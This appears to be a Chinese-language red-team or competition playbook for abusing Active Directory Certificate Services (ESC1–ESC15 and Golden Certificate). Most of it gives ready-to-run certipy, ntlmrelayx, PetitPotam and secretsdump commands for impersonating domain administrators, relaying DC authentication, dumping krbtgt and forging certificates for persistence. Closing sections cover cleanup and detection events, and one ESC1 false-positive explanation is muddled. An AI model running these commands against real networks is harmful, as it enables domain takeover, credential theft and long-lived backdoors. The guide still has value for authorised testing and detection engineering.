# AD CS 证书滥用：ESC1–ESC15 逐条判据与验伤

> 被 `competition-ad-certificate-abuse` 引用。AD CS 的价值在于**它把「配置错误」直接兑换成「域身份」**，
> 中间不需要破密码、不需要诱骗用户。但它是全套 AD 手法里**最容易「看起来成了其实没成」**的一类：
> 申请到证书 ≠ 证书能认证 ≠ 认证出的是高权身份。
>
> 本文按「谁能申请 → 需要什么条件 → 怎么利用 → 怎么证明」四列组织，最后单列 Golden Certificate 与吊销难题。

## 一、先分清三层，否则后面全错

| 层 | 是什么 | 失败表现 |
| --- | --- | --- |
| **模板（Template / pKICertificateTemplate）** | 定义「谁能申请、申请时能填什么、签出来带什么 EKU」 | 能申请，但签出来的证书不能用于登录 |
| **CA（Certification Authority）** | 定义「怎么签、要不要审批、要不要授权签名」 | 模板没问题，被 CA 的审批或策略拦住 |
| **映射（Mapping）** | AD 怎么把证书里的身份映射成账号 | 证书合法，但 PKINIT/Schannel 拒绝或映射到错误账号 |

**判据**：三者必须同时成立。报告里必须写成一条链
`enroll right → 模板/CA 缺陷 → 签发的证书（SAN/UPN/EKU） → 被哪个服务接受 → 得到什么身份`。

## 二、枚举：先跑扫描，不要背表

```bash
# 全量扫描（普通域用户即可，输出 JSON + 文本，-vulnerable 只列有问题项）
certipy-ad find -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -vulnerable -stdout -json out.json

# 只看 CA 层面配置
certipy-ad find -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 -ca-only

# 无 certipy 时的兜底：直接查模板对象的关键属性
ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w 'Passw0rd!' \
  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
  '(objectClass=pKICertificateTemplate)' name msPKI-Certificate-Name-Flag \
  msPKI-Enrollment-Flag pKIExtendedKeyUsage msPKI-Certificate-Application-Policy \
  nTSecurityDescriptor
```

要读的字段就这几个，记住它们的含义比记 ESC 编号有用：

| 属性 | 含义 | 危险取值 |
| --- | --- | --- |
| `msPKI-Certificate-Name-Flag` | 申请时可否自带 subject/SAN | `0x1` = `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` |
| `msPKI-Enrollment-Flag` | 注册时的特殊行为 | `0x2` 待审批、`0x8` 授权签名、`0x80000` 无安全扩展（ESC9） |
| `pKIExtendedKeyUsage` / `msPKI-Certificate-Application-Policy` | 签出来能干什么 | 含 `1.3.6.1.5.5.7.3.2`（Client Auth）/ `1.3.6.1.4.1.311.20.2.2`（Smartcard Logon） |
| `nTSecurityDescriptor` | 谁能申请（`Enroll`）/ 谁能改模板 | `Enroll` 里有 `Domain Users` 或 `Authenticated Users` |

## 三、ESC1：申请人自带 SAN（最常见，一步到域管）

**条件**：模板 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`（0x1）+ 有 Client Auth / Smartcard Logon EKU
+ 低权组有 `Enroll` + CA 不要求审批。

```bash
# 申请一张 UPN 写成域管的证书
certipy-ad req -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -template 'UserTemplate' \
  -upn 'administrator@corp.local' -sid 'S-1-5-21-1111-2222-3333-500'

# 用证书换 NT 哈希（PKINIT + UnPAC-the-hash）
certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.0.10 -username administrator -domain corp.local
```

`certipy-ad auth` 成功会打出：

```
[*] Got TGT
[*] Decrypting TGT ... Got NT hash for administrator@corp.local: 2b576acbe6bcfda7294d6bd18041b8fe
```

**验伤**：拿到 NT 哈希后必须真的用一次——`nxc smb 10.0.0.10 -u administrator -H <hash> -d corp.local`，
看到 `(Pwn3d!)`。**只看「Got TGT」不算**，TGT 可能不含高权 PAC。

**假阳性**：
- `req` 成功但 `auth` 报 `KDC_ERR_CLIENT_REVOKED` / `KDC_ERR_POLICY` → 证书被签了，但**账号被禁止智能卡登录**
  （`userAccountControl` 无 `SMARTCARD_REQUIRED` 不是问题，问题常是 `NOT_DELEGATED` 无关；真实原因多为
  该账号的 `msDS-KeyCredentialLink`/映射策略拒绝），或者证书的 EKU 里没有 `Smartcard Logon`。
- `auth` 报 `KDC_ERR_CERTIFICATE_MISMATCH` → 证书的 SAN 与 `-username` 不匹配，说明**模板其实没让你控制 SAN**。

## 四、ESC2 / ESC3 / ESC4：模板与代理

| ESC | 条件 | 利用 | 验伤要点 |
| --- | --- | --- | --- |
| **ESC2** | 模板 EKU 是 `Any Purpose`（`2.5.29.37.0`）或完全无 EKU | 当 ESC1 用（任意用途含 Client Auth）；也可当**下级 CA**用 | 签出的证书 `Enhanced Key Usage` 显示 `Any Purpose`；用它走 `certipy auth` 应成功 |
| **ESC3** | 模板含 `Certificate Request Agent` EKU（`1.3.6.1.4.1.311.20.2.1`）+ 你能申请 | 先用代理证书 `-on-behalf-of` 替别人申请 | 代理链上两个证书的 `Requester` 与 `Subject` 必须不同 |
| **ESC4** | 你对模板对象有 `GenericWrite`/`WriteProperty` | 把模板改成 ESC1（加 SAN 标志 + Client Auth EKU），打完**改回去** | 改完要 `certipy find` 复扫，看到该模板变成 `[!] Vulnerable to ESC1` |

```bash
# ESC3：两步代理
certipy-ad req -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -template 'EnrollmentAgent'      # 得到 agent.pfx
certipy-ad req -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -template 'UserTemplate' \
  -pfx agent.pfx -on-behalf-of 'CORP\administrator'

# ESC4：改模板 → 打 → 还原
certipy-ad template -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -template 'UserTemplate' -write-default-configuration
# 打完务必还原（否则是留后门，也会被复核发现）
certipy-ad template -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -template 'UserTemplate' -save-old
```

**ESC4 的隐藏坑**：`-write-default-configuration` 会把模板改成「兼容 ESC1 的宽松配置」，
但它同时可能**改掉 `pKIMaxIssuingDepth` 或 `pKICriticalExtensions`**，导致 CA 拒绝签发。
改之前先 `-save-old` 备份，失败就 `-restore`。

## 五、ESC5 / ESC6 / ESC7：CA 层面

| ESC | 条件 | 利用 |
| --- | --- | --- |
| **ESC5** | 对 PKI 相关对象有写权限（CA 的 `pKIEnrollmentService` 对象、`NTAuthCertificates`、`AIA/CDP` 容器） | 把恶意 CA 加进 `NTAuthCertificates` → **该 CA 签的任何证书全域可登录** |
| **ESC6** | CA 开了 `EDITF_ATTRIBUTESUBJECTALTNAME2`（0x40000） | **任意模板**都能在请求里塞 SAN，不需要模板本身允许 |
| **ESC7** | 你在 CA 上有 `ManageCA` 或 `ManageCertificates` | `ManageCA` → 给自己加 Officer 权限 + 开 ESC6；`ManageCertificates` → 批准挂起的请求 |

```bash
# ESC6 落地：任意模板 + 指定 SAN
certipy-ad req -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -template 'Machine' -upn 'administrator@corp.local'

# ESC7.1：ManageCA → 把自己加成 officer，然后开 ESC6
certipy-ad ca -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -add-officer 'user'
certipy-ad ca -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -enable-flag 'EDITF_ATTRIBUTESUBJECTALTNAME2'

# ESC7.2：请求挂起后自己批准（需要 Request ID）
certipy-ad ca -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -issue-request 1234
certipy-ad req -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -retrieve 1234
```

**ESC6 的验伤**：证书的 `Subject Alternative Name` 里出现你指定的 UPN，且 `certipy auth` 能出该账号的哈希。
**ESC6 假阳性**：`req` 成功但 SAN 是空的 → CA 的 flag 没真开（`certutil -getreg policy\EditFlags` 在 CA 上确认）。

## 六、ESC8 / ESC11：中继到注册端点（不破密码）

| ESC | 端点 | 前提 |
| --- | --- | --- |
| **ESC8** | `http://CA/certsrv/certfnsh.asp`（Web Enrollment，NTLM） | 装了 Web Enrollment 角色；能强制认证；未开 EPA |
| **ESC11** | `ICertRequest` RPC 接口（`\pipe\cert`） | CA 的 RPC 未强制签名（`IF_ENFORCEENCRYPTICERTREQUEST` 未开） |

```bash
# ESC8：中继到 Web Enrollment，给 DC 机器账号签一张证书
# 用 impacket 的 ntlmrelayx（--adcs 支持 ESC8），可靠且参数稳定
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 另一侧触发强制认证（详细见 relay-coercion-chain.md）
python3 PetitPotam.py -u 'user' -p 'Passw0rd!' 10.0.0.99 10.0.0.10

# 拿到 base64 证书 → 存成 pfx → 换 DC 机器账号哈希 → DCSync
base64 -d dc01.b64 > dc01.pfx
certipy-ad auth -pfx dc01.pfx -dc-ip 10.0.0.10
impacket-secretsdump -hashes :<DC01_MACHINE_HASH> -just-dc \
  'CORP.LOCAL/DC01$@10.0.0.10'
```

**验伤**：`relay` 打出的 `Got certificate!` + `auth` 出 `DC01$` 的 NT 哈希 + `secretsdump` 真的拉到 `krbtgt`。
三者缺一不算。特别是**中间那步**：机器账号哈希在 DC 上是被 `secretsdump` 认的，别的服务不一定。

## 七、ESC9 / ESC10：绕过强证书映射（不需要模板错配）

2022 年后微软引入 `StrongCertificateBindingEnforcement`，把证书映射收紧。这两条是**打映射层**：

| ESC | 条件 | 利用 |
| --- | --- | --- |
| **ESC9** | 模板 `msPKI-Enrollment-Flag` 含 `CT_FLAG_NO_SECURITY_EXTENSION`（0x80000），即新证书不带 `szOID_NTDS_CA_SECURITY_EXT` | 你对**受害账号**有 `GenericWrite` → 改它的 `userPrincipalName` 成目标 → 用受害账号申请证书 → 改回 UPN → 用证书以目标身份 PKINIT |
| **ESC10a** | DC 注册表 `StrongCertificateBindingEnforcement = 0`（Compatibility 模式可被降级） | 映射只看 SAN，不看 SID 扩展 |
| **ESC10b** | `CertificateMappingMethods` 含 `0x4`（UPN 映射） | 同上，UPN 即身份 |

```bash
# ESC9 完整链（三步都不能省）
# 1) 改受害账号 UPN 成目标
certipy-ad account -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -user 'victim' -upn 'administrator@corp.local' update

# 2) 用受害账号的凭据申请证书（模板需 no-security-extension）
certipy-ad req -u 'victim@corp.local' -p 'VictimPass!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -template 'NoSectExt'

# 3) UPN 改回去，再用证书认证
certipy-ad account -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -user 'victim' -upn 'victim@corp.local' update
certipy-ad auth -pfx victim.pfx -dc-ip 10.0.0.10 -domain corp.local
```

**验伤**：`auth` 出来的必须是 **administrator 的 NT 哈希**，不是 victim 的。
若是 victim 的哈希 → 映射没被绕过（说明 DC 的 `StrongCertificateBindingEnforcement` 是 2/Enforced）。

**假阳性**：`account update` 报成功但 UPN 没变 → 你需要的是对 `userPrincipalName` 的 `WriteProperty`，
`GenericAll` 有时被 `AdminSDHolder` 保护的对象拒绝（受害账号在受保护组里就不行）。

## 八、ESC12 / ESC13 / ESC14 / ESC15

| ESC | 条件 | 要点 |
| --- | --- | --- |
| **ESC12** | 能登到 CA 主机 + CA 私钥在 HSM 且 HSM 访问权限弱（如 YubiHSM 默认口令） | 直接导出 CA 私钥 → 进 Golden Certificate。属于**主机失陷**而非模板问题 |
| **ESC13** | 模板的 `msPKI-Enterprise-Oid` 关联到一个**带组成员资格的签发策略** | 签出的证书在 PAC 里带该组 → 等于直接获得组权限 |
| **ESC14** | 账号的 `altSecurityIdentities` 使用弱映射（`X509IssuerSerial`/`X509SKI`/`X509SHA1PublicKey`）且你可写 | 用你已有的证书伪造这些字段匹配 → 以该账号登录。**最隐蔽的一条** |
| **ESC15**（"EKUwu"，CVE-2024-49019） | 模板 **schema version 1**（未带 `msPKI-Certificate-Application-Policy`） | 请求里自带 `application policy`，可覆盖模板 EKU → 在只有低价值 EKU 的模板上塞 Client Auth |

```bash
# ESC15：在 v1 模板上塞 Client Auth EKU（certipy 5.x 支持）
certipy-ad req -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -template 'V1WebServer' \
  -application-policies 'Client Authentication' -upn 'administrator@corp.local'
```

**ESC15 的判据**：签出证书的 `Application Policies` 扩展里有你塞的 `1.3.6.1.5.5.7.3.2`
（不是在 `Extended Key Usage` 里——这两处在这个场景下含义不同，只看 EKU 会误判为失败）。

## 九、Golden Certificate：拿到 CA 私钥之后

一旦导出 CA 私钥（`certipy ca -backup`），你**不再需要 CA 在线**，可以离线签任何证书、任意有效期。

```bash
# 导出 CA 私钥与证书（需要 CA 上的管理员 + Backup 权限）
certipy-ad ca -u 'administrator@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10 \
  -ca 'CORP-CA' -backup

# 离线伪造一张 10 年有效、SAN=administrator 的证书
certipy-ad forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local' \
  -template 'UserTemplate' -out forged.pfx

# 用伪造证书认证
certipy-ad auth -pfx forged.pfx -dc-ip 10.0.0.10 -domain corp.local
```

**为什么这是持久化**：CA 私钥不变 = 你能无限次重签。即使密码全改、krbtgt 双重置，
只要 CA 私钥没换、旧证书没进 CRL，你的证书仍然能 PKINIT。

**验伤**：`forge` 出的证书 `Issuer` 与真 CA 完全一致，`auth` 能出哈希；
且**用一张已吊销的证书做对照**——如果吊销的也能登，说明环境根本不查 CRL（这本身就是结论）。

## 十、吊销与清理：AD CS 最麻烦的地方

| 问题 | 现实 |
| --- | --- |
| 吊销证书 | 只能由 CA 发 CRL；**客户端是否检查 CRL 取决于配置**，PKINIT 默认不强制查 |
| 换 CA 私钥 | 需要重建 CA 或重新签发 CA 证书，业务影响大，实战中基本不会做 |
| 清 `NTAuthCertificates` | ESC5 的后门要在这里删，否则恶意 CA 长期有效 |
| 模板还原 | ESC4 必须还原，否则复核时被当成「真实配置缺陷」 |
| `altSecurityIdentities` | ESC14 的后门要逐账号清 |

**报告必写**：`我签了几张、序列号是什么、哪张已吊销、哪张还在有效期内、环境是否会检查 CRL`。
不写这段，「证书攻击」的结论无法被修复方验证。

## 十一、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| ESC1 / ESC6 | CA 的 `CertSrv` 日志 + DC 4887 | 签发事件里 `Requester` 与证书 `Subject/SAN` **不是同一身份** |
| ESC3 | CA 日志 | 同一 `RequestID` 链上出现两个不同 `Requester`（代理链） |
| ESC4 | DC **4899** / 5136 | 模板对象 `msPKI-Certificate-Name-Flag`、`pKIExtendedKeyUsage` 被改 |
| ESC5 | DC 5136 | `CN=NTAuthCertificates` 下新增 `cACertificate` |
| ESC7 | CA 日志 + DC 5136 | `ManageCA` 权限变更；`certutil -setreg` 类操作落 4899 |
| ESC8 | CA IIS 日志 + 目标 4624 | `/certsrv/certfnsh.asp` 收到来自非浏览器的 NTLM 认证（UA 为空） |
| ESC9 / ESC10 | DC **4738**（账号变更） | `userPrincipalName` 被改后短时间内出现证书申请，随后改回 |
| ESC11 | CA RPC 审计 | `ICertRequest::Request` 来自陌生主机 |
| Golden Certificate | CA 日志**无**签发记录，但 DC 4768/4624 有认证 | **证书有效但 CA 没签过它** —— 唯一可靠的判据 |
| 证书登录 | DC 4768 | `Pre-Authentication Type = 16`（PKINIT）/ `Certificate Issuer Name` 字段 |

**最难检测的是 Golden Certificate**：CA 侧完全静默。可用的替代信号是
「同一张证书的 `Serial Number` 在 CA 数据库里查不到」，以及 `4768` 里 `Certificate Serial Number`
与 `Certificate Issuer` 的组合异常。这条规则要求你能读 CA 数据库（`certutil -view log`）。

## 十二、常见坑

1. **只看模板不看 CA**。ESC1 模板 + CA 要求「管理员审批」= 打不动。先看 `msPKI-Enrollment-Flag` 的 0x2 与 CA 的 `RequestDisposition`。
2. **证书签出来但没有 Client Auth EKU**。`certipy auth` 会报 `KDC_ERR_INVALID_CERTIFICATE` 之类；
   用 `certipy cert -pfx x.pfx -export-pem` 后 `openssl x509 -text` 亲自看 EKU 列表，别信工具摘要。
3. **`-sid` 忘了加**。现代环境要求证书带 `szOID_NTDS_CA_SECURITY_EXT`（含对象 SID），
   不加会被强映射拒掉。ESC1 成功的关键参数之一。
4. **改完模板不还原**。ESC4 是「借配置」，不是「改配置」，还原是流程的一部分。
5. **把「签发成功」写进报告当战果**。签发只证明模板错配；**必须多一步认证**（`certipy auth` 出哈希 + 哈希能用）。
6. **忽略 `certipy auth` 的 `-domain` 参数**。证书 SAN 是全限定名时需要它，否则报 `Cannot find domain`。
7. **证书过期**。默认模板有效期常是 1 年，但**测试环境常只有几小时**；`certipy auth` 报 `KDC_ERR_EXPIRED` 时先看 `NotAfter`。